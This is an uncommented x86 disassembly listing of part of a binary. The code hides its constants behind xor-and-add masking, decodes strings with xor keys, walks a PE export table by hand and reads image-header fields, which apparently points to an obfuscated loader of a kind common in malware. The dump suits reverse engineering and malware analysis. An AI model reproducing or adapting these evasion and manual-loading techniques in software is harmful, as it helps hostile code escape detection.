  427dec:	lea    eax,[ebp-0x21c]
  427df2:	mov    DWORD PTR [ebp-0x8],eax
  427df5:	mov    eax,DWORD PTR [ebp+0xc]
  427df8:	mov    DWORD PTR [ebp-0x10],eax
  427dfb:	mov    eax,DWORD PTR [ebp-0x4]
  427dfe:	xor    eax,edi
  427e00:	add    eax,esi
  427e02:	mov    DWORD PTR [ebp+0x10],eax
  427e05:	mov    eax,DWORD PTR [ebp+0xc]
  427e08:	push   ebx
  427e09:	call   0x427b33
  427e0e:	mov    ebx,eax
  427e10:	mov    eax,DWORD PTR [ebp+0x8]
  427e13:	mov    eax,DWORD PTR [eax+0x14]
  427e16:	jmp    0x427e70
  427e18:	mov    eax,DWORD PTR [ebp+0xc]
  427e1b:	sub    eax,0x8
  427e1e:	mov    DWORD PTR [ebp-0xc],eax
  427e21:	mov    eax,DWORD PTR [ebp-0xc]
  427e24:	mov    eax,DWORD PTR [eax+0x28]
  427e27:	call   0x427a1d
  427e2c:	mov    DWORD PTR [ebp+0x10],eax
  427e2f:	push   DWORD PTR [ebp+0x10]
  427e32:	mov    edx,DWORD PTR [ebp-0x8]
  427e35:	call   0x427bc2
  427e3a:	mov    eax,DWORD PTR [ebp-0x4]
  427e3d:	xor    eax,edi
  427e3f:	add    eax,esi
  427e41:	cmp    eax,ebx
  427e43:	jne    0x427e4d
  427e45:	mov    eax,DWORD PTR [ebp-0x8]
  427e48:	call   0x427aab
  427e4d:	mov    eax,DWORD PTR [ebp-0x14]
  427e50:	xor    eax,edi
  427e52:	add    eax,esi
  427e54:	push   eax
  427e55:	push   DWORD PTR [ebp-0x10]
  427e58:	mov    eax,DWORD PTR [ebp-0x8]
  427e5b:	call   0x4277d7
  427e60:	mov    ecx,DWORD PTR [ebp-0x4]
  427e63:	xor    ecx,edi
  427e65:	add    ecx,esi
  427e67:	cmp    eax,ecx
  427e69:	je     0x427e8e
  427e6b:	mov    eax,DWORD PTR [ebp+0xc]
  427e6e:	mov    eax,DWORD PTR [eax]
  427e70:	mov    DWORD PTR [ebp+0xc],eax
  427e73:	mov    eax,DWORD PTR [ebp+0x8]
  427e76:	mov    ecx,DWORD PTR [ebp+0xc]
  427e79:	add    eax,0x14
  427e7c:	cmp    ecx,eax
  427e7e:	jne    0x427e18
  427e80:	mov    eax,DWORD PTR [ebp-0x4]
  427e83:	xor    eax,edi
  427e85:	add    eax,esi
  427e87:	pop    ebx
  427e88:	pop    edi
  427e89:	pop    esi
  427e8a:	leave  
  427e8b:	ret    0xc
  427e8e:	mov    eax,DWORD PTR [ebp-0xc]
  427e91:	mov    eax,DWORD PTR [eax+0x18]
  427e94:	jmp    0x427e87
  427e96:	push   ebp
  427e97:	mov    ebp,esp
  427e99:	mov    eax,DWORD PTR [ebp+0xc]
  427e9c:	sub    esp,0x10
  427e9f:	cmp    DWORD PTR [ebp+0x8],0x0
  427ea3:	push   ebx
  427ea4:	push   esi
  427ea5:	push   edi
  427ea6:	je     0x427f5b
  427eac:	test   eax,eax
  427eae:	je     0x427f5b
  427eb4:	movzx  eax,WORD PTR [eax+0x20]
  427eb8:	mov    ecx,eax
  427eba:	mov    DWORD PTR [ebp-0x10],eax
  427ebd:	xor    edx,edx
  427ebf:	and    DWORD PTR [ebp-0x8],edx
  427ec2:	mov    eax,0x8a98
  427ec7:	xor    ecx,eax
  427ec9:	add    ecx,0x3b5a
  427ecf:	mov    DWORD PTR [ebp-0xc],ecx
  427ed2:	and    DWORD PTR [ebp-0x4],0x0
  427ed6:	xor    ecx,ecx
  427ed8:	push   0x7d
  427eda:	pop    edi
  427edb:	cmp    cx,WORD PTR [ebp-0xc]
  427edf:	jae    0x427f45
  427ee1:	lea    esi,[edx-0x3b5a]
  427ee7:	xor    esi,eax
  427ee9:	movzx  ecx,WORD PTR [ebp-0x4]
  427eed:	mov    ebx,DWORD PTR [ebp+0xc]
  427ef0:	lea    ecx,[ebx+ecx*4]
  427ef3:	cmp    WORD PTR [ecx+0x2],si
  427ef7:	jne    0x427f30
  427ef9:	movzx  ecx,WORD PTR [ecx]
  427efc:	mov    edi,0x4e3e
  427f01:	cmp    cx,di
  427f04:	jne    0x427f12
  427f06:	mov    ebx,DWORD PTR [ebp+0x8]
  427f09:	movzx  edi,dx
  427f0c:	cmp    BYTE PTR [edi+ebx*1],0x0
  427f10:	je     0x427f3f
  427f12:	mov    ebx,DWORD PTR [ebp+0x8]
  427f15:	movzx  edi,dx
  427f18:	movsx  di,BYTE PTR [edi+ebx*1]
  427f1d:	mov    ebx,0x3b5a
  427f22:	sub    di,bx
  427f25:	xor    di,ax
  427f28:	cmp    cx,di
  427f2b:	je     0x427f3f
  427f2d:	push   0xffffff83
  427f2f:	pop    edi
  427f30:	inc    DWORD PTR [ebp-0x4]
  427f33:	mov    cx,WORD PTR [ebp-0xc]
  427f37:	cmp    WORD PTR [ebp-0x4],cx
  427f3b:	jb     0x427ee9
  427f3d:	jmp    0x427f45
  427f3f:	inc    DWORD PTR [ebp-0x8]
  427f42:	push   0x7c
  427f44:	pop    edi
  427f45:	mov    esi,DWORD PTR [ebp+0x8]
  427f48:	movzx  ecx,dx
  427f4b:	cmp    BYTE PTR [ecx+esi*1],0x0
  427f4f:	je     0x427f64
  427f51:	inc    edx
  427f52:	cmp    edi,0xffffff83
  427f55:	jne    0x427ed2
  427f5b:	xor    eax,eax
  427f5d:	pop    edi
  427f5e:	pop    esi
  427f5f:	pop    ebx
  427f60:	leave  
  427f61:	ret    0x8
  427f64:	mov    ecx,DWORD PTR [ebp-0x8]
  427f67:	add    ecx,0xffffc4a6
  427f6d:	xor    cx,ax
  427f70:	xor    eax,eax
  427f72:	cmp    cx,WORD PTR [ebp-0x10]
  427f76:	sete   al
  427f79:	jmp    0x427f5d
  427f7b:	push   ebp
  427f7c:	mov    ebp,esp
  427f7e:	sub    esp,0x50
  427f81:	push   edi
  427f82:	mov    edi,eax
  427f84:	mov    eax,DWORD PTR [edi+0x1a8]
  427f8a:	cmp    DWORD PTR [eax],0x0
  427f8d:	jne    0x427f96
  427f8f:	xor    eax,eax
  427f91:	jmp    0x4280c7
  427f96:	push   DWORD PTR [ebp+0x8]
  427f99:	push   0x2c
  427f9b:	pop    eax
  427f9c:	call   0x427d2b
  427fa1:	mov    edx,DWORD PTR [edi+0x1ac]
  427fa7:	lea    eax,[edi+0x22]
  427faa:	mov    DWORD PTR [ebp-0x4c],eax
  427fad:	lea    eax,[edi+0x44]
  427fb0:	mov    DWORD PTR [ebp-0x48],eax
  427fb3:	lea    eax,[edi+0x66]
  427fb6:	mov    DWORD PTR [ebp-0x44],eax
  427fb9:	lea    eax,[edi+0x88]
  427fbf:	mov    DWORD PTR [ebp-0x40],eax
  427fc2:	lea    eax,[edi+0xaa]
  427fc8:	mov    DWORD PTR [ebp-0x3c],eax
  427fcb:	lea    eax,[edi+0xcc]
  427fd1:	mov    DWORD PTR [ebp-0x38],eax
  427fd4:	lea    eax,[edi+0xee]
  427fda:	mov    DWORD PTR [ebp-0x34],eax
  427fdd:	lea    eax,[edi+0x110]
  427fe3:	mov    DWORD PTR [ebp-0x30],eax
  427fe6:	lea    eax,[edi+0x132]
  427fec:	mov    DWORD PTR [ebp-0x2c],eax
  427fef:	lea    eax,[edi+0x154]
  427ff5:	push   edi
  427ff6:	mov    DWORD PTR [ebp-0x50],edi
  427ff9:	mov    DWORD PTR [ebp-0x28],eax
  427ffc:	call   0x4280fb
  428001:	push   eax
  428002:	mov    eax,DWORD PTR [edi+0x1a8]
  428008:	push   DWORD PTR [eax]
  42800a:	call   0x427d9c
  42800f:	mov    DWORD PTR [ebp-0x10],eax
  428012:	test   eax,eax
  428014:	je     0x4280c7
  42801a:	mov    ecx,DWORD PTR [eax+0x3c]
  42801d:	push   ebx
  42801e:	push   esi
  42801f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  428023:	add    esi,eax
  428025:	mov    edi,DWORD PTR [esi+0x24]
  428028:	mov    ecx,DWORD PTR [esi+0x1c]
  42802b:	mov    edx,DWORD PTR [esi+0x20]
  42802e:	mov    ebx,DWORD PTR [esi+0x18]
  428031:	add    edi,eax
  428033:	mov    DWORD PTR [ebp-0x20],edi
  428036:	mov    edi,DWORD PTR [esi+0x14]
  428039:	add    ecx,eax
  42803b:	add    edx,eax
  42803d:	mov    DWORD PTR [ebp-0xc],ecx
  428040:	mov    DWORD PTR [ebp-0x1c],edx
  428043:	mov    DWORD PTR [ebp-0x8],edi
  428046:	cmp    edi,ebx
  428048:	ja     0x42804d
  42804a:	mov    DWORD PTR [ebp-0x8],ebx
  42804d:	xor    ebx,ebx
  42804f:	mov    DWORD PTR [ebp-0x18],ebx
  428052:	cmp    DWORD PTR [ebp-0x8],ebx
  428055:	jbe    0x4280c5
  428057:	jmp    0x42805c
  428059:	mov    edx,DWORD PTR [ebp-0x1c]
  42805c:	mov    edi,DWORD PTR [ebp-0x20]
  42805f:	movzx  edi,WORD PTR [edi+ebx*2]
  428063:	cmp    ebx,DWORD PTR [esi+0x18]
  428066:	jae    0x4280c5
  428068:	cmp    edi,DWORD PTR [esi+0x14]
  42806b:	jae    0x4280c5
  42806d:	mov    ebx,DWORD PTR [edx+ebx*4]
  428070:	mov    edx,DWORD PTR [ebp+0x8]
  428073:	mov    edi,DWORD PTR [ecx+edi*4]
  428076:	mov    DWORD PTR [ebp-0x4],edx
  428079:	lea    edx,[ebp-0x50]
  42807c:	add    ebx,eax
  42807e:	add    edi,eax
  428080:	sub    edx,DWORD PTR [ebp+0x8]
  428083:	mov    DWORD PTR [ebp-0x14],0xb
  42808a:	mov    DWORD PTR [ebp-0x24],edx
  42808d:	mov    edx,DWORD PTR [ebp-0x4]
  428090:	cmp    DWORD PTR [edx],0x0
  428093:	jne    0x4280b0
  428095:	mov    eax,DWORD PTR [ebp-0x24]
  428098:	push   DWORD PTR [eax+edx*1]
  42809b:	push   ebx
  42809c:	call   0x427e96
  4280a1:	mov    ecx,DWORD PTR [ebp-0xc]
  4280a4:	test   eax,eax
  4280a6:	je     0x4280ad
  4280a8:	mov    eax,DWORD PTR [ebp-0x4]
  4280ab:	mov    DWORD PTR [eax],edi
  4280ad:	mov    eax,DWORD PTR [ebp-0x10]
  4280b0:	add    DWORD PTR [ebp-0x4],0x4
  4280b4:	dec    DWORD PTR [ebp-0x14]
  4280b7:	jne    0x42808d
  4280b9:	mov    ebx,DWORD PTR [ebp-0x18]
  4280bc:	inc    ebx
  4280bd:	mov    DWORD PTR [ebp-0x18],ebx
  4280c0:	cmp    ebx,DWORD PTR [ebp-0x8]
  4280c3:	jb     0x428059
  4280c5:	pop    esi
  4280c6:	pop    ebx
  4280c7:	pop    edi
  4280c8:	leave  
  4280c9:	ret    0x4
  4280cc:	push   ebp
  4280cd:	mov    ebp,esp
  4280cf:	mov    eax,DWORD PTR [ebp+0x8]
  4280d2:	push   esi
  4280d3:	push   DWORD PTR [eax+0x1e0]
  4280d9:	lea    esi,[eax+0x198]
  4280df:	mov    eax,DWORD PTR [ebp+0x8]
  4280e2:	call   0x427f7b
  4280e7:	mov    ecx,DWORD PTR [esi]
  4280e9:	mov    DWORD PTR [ecx],eax
  4280eb:	mov    eax,DWORD PTR [esi]
  4280ed:	xor    ecx,ecx
  4280ef:	cmp    DWORD PTR [eax],ecx
  4280f1:	pop    esi
  4280f2:	setne  cl
  4280f5:	mov    eax,ecx
  4280f7:	pop    ebp
  4280f8:	ret    0x4
  4280fb:	mov    ecx,DWORD PTR [edi+0x188]
  428101:	push   ebx
  428102:	jmp    0x428117
  428104:	xor    eax,0x8a98
  428109:	add    eax,0x3b5a
  42810e:	mov    WORD PTR [ecx],ax
  428111:	add    ecx,0x2
  428114:	add    edx,0x2
  428117:	movzx  eax,WORD PTR [edx]
  42811a:	mov    ebx,0x4e3e
  42811f:	cmp    ax,bx
  428122:	jne    0x428104
  428124:	xor    eax,eax
  428126:	mov    WORD PTR [ecx],ax
  428129:	mov    eax,DWORD PTR [edi+0x188]
  42812f:	pop    ebx
  428130:	ret    
  428131:	push   edi
  428132:	mov    edi,eax
  428134:	mov    eax,DWORD PTR [esi+0x188]
  42813a:	shl    edi,0x6
  42813d:	add    eax,edi
  42813f:	jmp    0x42814a
  428141:	xor    cl,0x7c
  428144:	inc    cl
  428146:	mov    BYTE PTR [eax],cl
  428148:	inc    eax
  428149:	inc    edx
  42814a:	mov    cl,BYTE PTR [edx]
  42814c:	cmp    cl,0x83
  42814f:	jne    0x428141
  428151:	mov    BYTE PTR [eax],0x0
  428154:	mov    eax,DWORD PTR [esi+0x188]
  42815a:	add    eax,edi
  42815c:	pop    edi
  42815d:	ret    
  42815e:	push   ebp
  42815f:	mov    ebp,esp
  428161:	sub    esp,0x14
  428164:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42816b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  428172:	mov    eax,DWORD PTR [ebx]
  428174:	mov    DWORD PTR [ebp-0x8],eax
  428177:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42817e:	push   esi
  42817f:	push   edi
  428180:	mov    DWORD PTR [ebp-0x14],0xead71885
  428187:	mov    edi,DWORD PTR [ebp-0x4]
  42818a:	mov    ecx,DWORD PTR [ebp-0x10]
  42818d:	mov    eax,0x75108aa
  428192:	xor    edi,eax
  428194:	mov    edx,0x3272f1
  428199:	xor    ecx,eax
  42819b:	add    edi,edx
  42819d:	add    ecx,edx
  42819f:	imul   edi,ecx
  4281a2:	jmp    0x4281ea
  4281a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4281a7:	mov    esi,DWORD PTR [ebp-0x4]
  4281aa:	xor    ecx,eax
  4281ac:	xor    esi,eax
  4281ae:	add    ecx,edx
  4281b0:	add    esi,edx
  4281b2:	test   esi,ecx
  4281b4:	mov    esi,DWORD PTR [ebp-0x8]
  4281b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4281ba:	je     0x4281d1
  4281bc:	xor    ecx,eax
  4281be:	xor    esi,eax
  4281c0:	add    ecx,edx
  4281c2:	add    esi,edx
  4281c4:	shr    esi,cl
  4281c6:	mov    ecx,DWORD PTR [ebp-0x14]
  4281c9:	xor    ecx,eax
  4281cb:	add    ecx,edx
  4281cd:	xor    esi,ecx
  4281cf:	jmp    0x4281db
  4281d1:	xor    esi,eax
  4281d3:	xor    ecx,eax
  4281d5:	add    esi,edx
  4281d7:	add    ecx,edx
  4281d9:	shr    esi,cl
  4281db:	mov    DWORD PTR [ebp-0x8],esi
  4281de:	mov    ecx,DWORD PTR [ebp-0x4]
  4281e1:	xor    ecx,eax
  4281e3:	lea    edi,[edi+ecx*1+0x3272f1]
  4281ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4281ed:	mov    esi,DWORD PTR [ebp-0x4]
  4281f0:	xor    esi,eax
  4281f2:	xor    ecx,eax
  4281f4:	sub    ecx,esi
  4281f6:	cmp    edi,ecx
  4281f8:	jbe    0x4281a4
  4281fa:	mov    eax,DWORD PTR [ebp-0x8]
  4281fd:	pop    edi
  4281fe:	mov    DWORD PTR [ebx],eax
  428200:	mov    eax,DWORD PTR [ebp-0x8]
  428203:	pop    esi
  428204:	leave  
  428205:	ret    
  428206:	push   ebp
  428207:	mov    ebp,esp
  428209:	sub    esp,0x38
  42820c:	push   ebx
  42820d:	mov    ebx,0xf89c85a5
  428212:	mov    DWORD PTR [ebp-0x4],ebx
  428215:	lea    ecx,[ebx+0x15]
  428218:	mov    DWORD PTR [ebp-0x24],ecx
  42821b:	mov    eax,DWORD PTR [ebp-0x4]
  42821e:	mov    edx,DWORD PTR [ebp+0x8]
  428221:	push   esi
  428222:	mov    esi,0x75108aa
  428227:	xor    eax,esi
  428229:	push   edi
  42822a:	mov    edi,0x3272f1
  42822f:	add    eax,edi
  428231:	cmp    edx,eax
  428233:	mov    eax,DWORD PTR [ebp-0x4]
  428236:	je     0x42839a
  42823c:	mov    edx,DWORD PTR [ebp+0xc]
  42823f:	xor    eax,esi
  428241:	add    eax,edi
  428243:	cmp    edx,eax
  428245:	je     0x428397
  42824b:	mov    eax,DWORD PTR [ebp+0x10]
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	mov    DWORD PTR [ebp-0x14],eax
  428254:	mov    eax,DWORD PTR [ebp+0x8]
  428257:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  42825e:	mov    DWORD PTR [ebp-0xc],eax
  428261:	lea    eax,[ebx+0x16]
  428264:	mov    DWORD PTR [ebp-0x1c],eax
  428267:	mov    DWORD PTR [ebp-0x10],ebx
  42826a:	mov    DWORD PTR [ebp+0xc],ecx
  42826d:	mov    DWORD PTR [ebp+0x10],eax
  428270:	mov    eax,DWORD PTR [ebp+0xc]
  428273:	xor    eax,esi
  428275:	mov    DWORD PTR [ebp-0x20],edx
  428278:	sub    edx,eax
  42827a:	sub    edx,edi
  42827c:	mov    DWORD PTR [ebp+0x8],edx
  42827f:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428286:	jmp    0x428387
  42828b:	mov    eax,DWORD PTR [ebp+0xc]
  42828e:	mov    ecx,DWORD PTR [ebp+0xc]
  428291:	xor    eax,esi
  428293:	xor    ecx,esi
  428295:	lea    ecx,[eax+ecx*1+0x64e5e2]
  42829c:	mov    eax,DWORD PTR [ebp+0x8]
  42829f:	xor    edx,edx
  4282a1:	div    ecx
  4282a3:	mov    eax,DWORD PTR [ebp+0x10]
  4282a6:	mov    ecx,DWORD PTR [ebp+0xc]
  4282a9:	xor    eax,esi
  4282ab:	xor    ecx,esi
  4282ad:	sub    eax,ecx
  4282af:	cmp    edx,eax
  4282b1:	jne    0x428346
  4282b7:	mov    eax,DWORD PTR [ebp+0x8]
  4282ba:	mov    ecx,DWORD PTR [ebp-0xc]
  4282bd:	mov    dl,BYTE PTR [eax+ecx*1]
  4282c0:	mov    eax,DWORD PTR [ebp-0x10]
  4282c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282c6:	xor    eax,esi
  4282c8:	xor    ecx,esi
  4282ca:	add    eax,edi
  4282cc:	add    ecx,edi
  4282ce:	cmp    eax,ecx
  4282d0:	jae    0x428318
  4282d2:	lea    ecx,[eax-0x3272f1]
  4282d8:	mov    DWORD PTR [ebp-0x4],ecx
  4282db:	mov    ebx,DWORD PTR [ebp-0x4]
  4282de:	xor    ebx,esi
  4282e0:	add    ebx,0x7f55d8fb
  4282e6:	lea    ecx,[ebp+eax*4-0x38]
  4282ea:	mov    DWORD PTR [ecx],ebx
  4282ec:	mov    ebx,DWORD PTR [ecx]
  4282ee:	cmp    ebx,0x244ecb98
  4282f4:	jbe    0x4282fe
  4282f6:	add    DWORD PTR [ecx],0x405fcd9
  4282fc:	jmp    0x428304
  4282fe:	add    DWORD PTR [ecx],0xfdaf4327
  428304:	mov    ecx,DWORD PTR [ebp-0x8]
  428307:	xor    ecx,esi
  428309:	inc    eax
  42830a:	inc    DWORD PTR [ebp-0x4]
  42830d:	add    ecx,edi
  42830f:	cmp    eax,ecx
  428311:	jb     0x4282db
  428313:	mov    ebx,0xf89c85a5
  428318:	cmp    DWORD PTR [ebp-0x14],0x0
  42831c:	jne    0x428325
  42831e:	xor    dl,0x7c
  428321:	inc    dl
  428323:	jmp    0x42833b
  428325:	mov    eax,DWORD PTR [ebp-0x18]
  428328:	xor    al,0xaa
  42832a:	mov    cl,0xf
  42832c:	sub    cl,al
  42832e:	add    dl,cl
  428330:	mov    ecx,DWORD PTR [ebp-0x1c]
  428333:	xor    cl,0xaa
  428336:	sub    cl,0xf
  428339:	ror    dl,cl
  42833b:	xor    eax,eax
  42833d:	mov    eax,DWORD PTR [ebp+0x8]
  428340:	mov    ecx,DWORD PTR [ebp-0xc]
  428343:	mov    BYTE PTR [eax+ecx*1],dl
  428346:	mov    eax,DWORD PTR [ebp+0x8]
  428349:	mov    ecx,DWORD PTR [ebp-0x10]
  42834c:	sub    eax,edi
  42834e:	xor    eax,esi
  428350:	cmp    eax,ecx
  428352:	jne    0x428375
  428354:	mov    eax,DWORD PTR [ebp+0x10]
  428357:	mov    ecx,DWORD PTR [ebp+0xc]
  42835a:	xor    eax,esi
  42835c:	xor    ecx,esi
  42835e:	sub    eax,ecx
  428360:	mov    ecx,DWORD PTR [ebp-0x20]
  428363:	sub    eax,edi
  428365:	xor    eax,esi
  428367:	mov    DWORD PTR [ebp+0x10],eax
  42836a:	mov    eax,DWORD PTR [ebp+0xc]
  42836d:	xor    eax,esi
  42836f:	sub    ecx,eax
  428371:	sub    ecx,edi
  428373:	jmp    0x428384
  428375:	mov    eax,DWORD PTR [ebp+0xc]
  428378:	xor    eax,esi
  42837a:	mov    ecx,0xffcd8d0f
  42837f:	sub    ecx,eax
  428381:	add    ecx,DWORD PTR [ebp+0x8]
  428384:	mov    DWORD PTR [ebp+0x8],ecx
  428387:	mov    eax,DWORD PTR [ebp+0x10]
  42838a:	cmp    eax,ebx
  42838c:	jne    0x42828b
  428392:	mov    eax,DWORD PTR [ebp-0x24]
  428395:	jmp    0x42839a
  428397:	mov    eax,DWORD PTR [ebp-0x4]
  42839a:	xor    eax,esi
  42839c:	add    eax,edi
  42839e:	pop    edi
  42839f:	pop    esi
  4283a0:	pop    ebx
  4283a1:	leave  
  4283a2:	ret    0xc
  4283a5:	push   ebp
  4283a6:	mov    ebp,esp
  4283a8:	sub    esp,0x420
  4283ae:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4283b5:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  4283bc:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  4283c3:	push   ebx
  4283c4:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  4283cb:	mov    eax,DWORD PTR [ebp-0x14]
  4283ce:	push   esi
  4283cf:	mov    esi,0x75108aa
  4283d4:	push   edi
  4283d5:	xor    eax,esi
  4283d7:	mov    edi,0x3272f1
  4283dc:	add    eax,edi
  4283de:	mov    DWORD PTR [ebp-0x8],eax
  4283e1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  4283e8:	mov    DWORD PTR [ebp-0x4],0xead71885
  4283ef:	mov    DWORD PTR [ebp-0x10],0x8
  4283f6:	mov    ecx,ecx
  4283f8:	mov    eax,DWORD PTR [ebp-0xc]
  4283fb:	mov    ecx,DWORD PTR [ebp-0x14]
  4283fe:	xor    eax,esi
  428400:	xor    ecx,esi
  428402:	add    eax,edi
  428404:	add    ecx,edi
  428406:	imul   eax,ecx
  428409:	jmp    0x42843c
  42840b:	mov    eax,DWORD PTR [ebp-0x4]
  42840e:	sub    eax,edi
  428410:	xor    eax,esi
  428412:	mov    DWORD PTR [ebp-0x8],eax
  428415:	lea    ebx,[ebp-0x8]
  428418:	call   0x42815e
  42841d:	mov    DWORD PTR [ebp-0x8],eax
  428420:	mov    eax,DWORD PTR [ebp-0x8]
  428423:	mov    ecx,DWORD PTR [ebp-0x4]
  428426:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42842d:	mov    eax,DWORD PTR [ebp-0xc]
  428430:	mov    ecx,DWORD PTR [ebp-0x4]
  428433:	xor    eax,esi
  428435:	lea    eax,[eax+ecx*1+0x3272f1]
  42843c:	mov    DWORD PTR [ebp-0x4],eax
  42843f:	mov    eax,DWORD PTR [ebp-0x18]
  428442:	mov    ecx,DWORD PTR [ebp-0xc]
  428445:	xor    ecx,esi
  428447:	xor    eax,esi
  428449:	sub    eax,ecx
  42844b:	mov    ecx,DWORD PTR [ebp-0x4]
  42844e:	cmp    ecx,eax
  428450:	jbe    0x42840b
  428452:	mov    eax,DWORD PTR [ebp-0x1c]
  428455:	xor    eax,esi
  428457:	add    eax,edi
  428459:	mov    DWORD PTR [ebp-0x8],eax
  42845c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428463:	mov    ebx,ebx
  428465:	jmp    0x4284c8
  428467:	mov    ecx,DWORD PTR [ebp-0x20]
  42846a:	mov    eax,DWORD PTR [ebp-0x8]
  42846d:	xor    ecx,esi
  42846f:	add    ecx,edi
  428471:	shr    eax,cl
  428473:	mov    DWORD PTR [ebp-0x4],eax
  428476:	mov    eax,DWORD PTR [ebp+0x8]
  428479:	mov    cl,BYTE PTR [eax]
  42847b:	mov    BYTE PTR [ebp+0xb],cl
  42847e:	mov    cl,BYTE PTR [ebp+0xb]
  428481:	mov    edx,DWORD PTR [ebp-0x8]
  428484:	movzx  ecx,cl
  428487:	xor    ecx,edx
  428489:	mov    DWORD PTR [ebp+0x8],ecx
  42848c:	mov    ecx,DWORD PTR [ebp-0x18]
  42848f:	mov    edx,DWORD PTR [ebp+0x8]
  428492:	xor    ecx,esi
  428494:	add    ecx,edi
  428496:	and    ecx,edx
  428498:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  42849f:	mov    edx,DWORD PTR [ebp-0x4]
  4284a2:	xor    ecx,edx
  4284a4:	mov    DWORD PTR [ebp-0x8],ecx
  4284a7:	mov    ecx,DWORD PTR [ebp-0xc]
  4284aa:	xor    ecx,esi
  4284ac:	lea    eax,[eax+ecx*1+0x3272f1]
  4284b3:	mov    DWORD PTR [ebp+0x8],eax
  4284b6:	mov    eax,DWORD PTR [ebp-0xc]
  4284b9:	xor    eax,esi
  4284bb:	mov    ecx,0xffcd8d0f
  4284c0:	sub    ecx,eax
  4284c2:	add    ecx,DWORD PTR [ebp-0x10]
  4284c5:	mov    DWORD PTR [ebp-0x10],ecx
  4284c8:	mov    eax,DWORD PTR [ebp-0x14]
  4284cb:	mov    ecx,DWORD PTR [ebp-0x10]
  4284ce:	xor    eax,esi
  4284d0:	add    eax,edi
  4284d2:	cmp    ecx,eax
  4284d4:	jne    0x428467
  4284d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4284d9:	mov    ecx,DWORD PTR [ebp-0x8]
  4284dc:	xor    eax,esi
  4284de:	add    eax,edi
  4284e0:	pop    edi
  4284e1:	pop    esi
  4284e2:	xor    eax,ecx
  4284e4:	pop    ebx
  4284e5:	leave  
  4284e6:	ret    0x4
  4284e9:	push   ebp
  4284ea:	mov    ebp,esp
  4284ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4284ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4284f2:	mov    edx,DWORD PTR [ebp+0x10]
  4284f5:	mov    eax,DWORD PTR [eax+0x190]
  4284fb:	mov    eax,DWORD PTR [eax]
  4284fd:	sub    esp,0x64
  428500:	push   ebx
  428501:	push   esi
  428502:	push   edi
  428503:	mov    edi,0x75108aa
  428508:	xor    ecx,edi
  42850a:	mov    ebx,0x3272f1
  42850f:	add    ecx,ebx
  428511:	cmp    ecx,edx
  428513:	jne    0x428524
  428515:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  42851f:	jmp    0x428a20
  428524:	mov    ecx,DWORD PTR [ebp+0x8]
  428527:	mov    esi,DWORD PTR [ebp+0x14]
  42852a:	mov    edx,DWORD PTR [esi]
  42852c:	xor    ecx,edi
  42852e:	add    ecx,ebx
  428530:	cmp    edx,ecx
  428532:	je     0x4289db
  428538:	mov    ecx,DWORD PTR [ebp+0x1c]
  42853b:	mov    DWORD PTR [ebp-0x1c],eax
  42853e:	mov    DWORD PTR [ebp+0x1c],ecx
  428541:	mov    ecx,DWORD PTR [ebp+0x18]
  428544:	mov    eax,DWORD PTR [esi]
  428546:	mov    DWORD PTR [ebp-0x20],eax
  428549:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428550:	mov    edx,0xf89c85ba
  428555:	mov    DWORD PTR [ebp-0x8],edx
  428558:	mov    eax,DWORD PTR [ebp+0x1c]
  42855b:	mov    DWORD PTR [ebp+0x1c],eax
  42855e:	mov    eax,DWORD PTR [ebp+0x1c]
  428561:	mov    eax,DWORD PTR [eax+0x190]
  428567:	mov    eax,DWORD PTR [eax]
  428569:	mov    DWORD PTR [ebp-0x24],ecx
  42856c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42856f:	mov    ecx,DWORD PTR [ecx+0x190]
  428575:	mov    ecx,DWORD PTR [ecx]
  428577:	add    ecx,DWORD PTR [eax+0x3c]
  42857a:	mov    DWORD PTR [ebp+0x10],ecx
  42857d:	mov    eax,DWORD PTR [ebp+0x8]
  428580:	xor    eax,edi
  428582:	add    eax,ebx
  428584:	mov    DWORD PTR [ebp-0x4],eax
  428587:	mov    eax,DWORD PTR [ebp+0x8]
  42858a:	xor    eax,edi
  42858c:	add    eax,ebx
  42858e:	mov    DWORD PTR [ebp+0x18],eax
  428591:	mov    eax,DWORD PTR [ebp+0x10]
  428594:	mov    eax,DWORD PTR [eax+0x50]
  428597:	sub    eax,0xc
  42859a:	mov    DWORD PTR [ebp-0x28],eax
  42859d:	mov    eax,DWORD PTR [ebp+0x10]
  4285a0:	mov    eax,DWORD PTR [eax+0x38]
  4285a3:	mov    ecx,DWORD PTR [ebp+0x10]
  4285a6:	dec    eax
  4285a7:	test   DWORD PTR [ecx+0x54],eax
  4285aa:	mov    eax,DWORD PTR [ebp+0x10]
  4285ad:	je     0x4285c7
  4285af:	mov    eax,DWORD PTR [eax+0x38]
  4285b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4285b5:	mov    ecx,DWORD PTR [ecx+0x54]
  4285b8:	dec    eax
  4285b9:	not    eax
  4285bb:	and    ecx,eax
  4285bd:	mov    eax,DWORD PTR [ebp+0x10]
  4285c0:	mov    eax,DWORD PTR [eax+0x38]
  4285c3:	add    eax,ecx
  4285c5:	jmp    0x4285ca
  4285c7:	mov    eax,DWORD PTR [eax+0x54]
  4285ca:	mov    DWORD PTR [ebp+0x1c],eax
  4285cd:	mov    eax,DWORD PTR [ebp+0x8]
  4285d0:	xor    eax,edi
  4285d2:	add    eax,ebx
  4285d4:	mov    DWORD PTR [ebp+0x18],eax
